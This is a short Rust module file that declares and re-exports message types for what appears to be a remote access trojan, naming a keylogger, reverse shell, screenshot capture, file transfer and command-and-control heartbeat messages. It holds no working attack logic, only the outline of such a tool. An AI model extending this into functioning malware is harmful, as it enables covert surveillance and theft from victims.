// src/messages/mod.rs
pub mod backend;
pub mod command;
pub mod common;
pub mod file;
pub mod heartbeat;
pub mod rat;
pub mod keylogger;


// Re-export common types for easier access
pub use backend::{BackendMessageType, ResponseType};
pub use command::{CliCommand, CliResponse, ReverseShell};
pub use common::{MessageEnvelope, MessageType, Metadata, MetadataWithId, ResponseStatus};
pub use file::{
  DirItem, FileDownloadStatus, FileDownloadStatusData, FileItem, FileNode, FileNodeData,
  FileRequest, FileTransferChunk, FileTransferResult, ListDir, Screenshot,
};
pub use heartbeat::{FirstBeat, HeartbeatType};
pub use rat::{C2RMessageType, R2CMessageType};
pub use keylogger::KeylogData;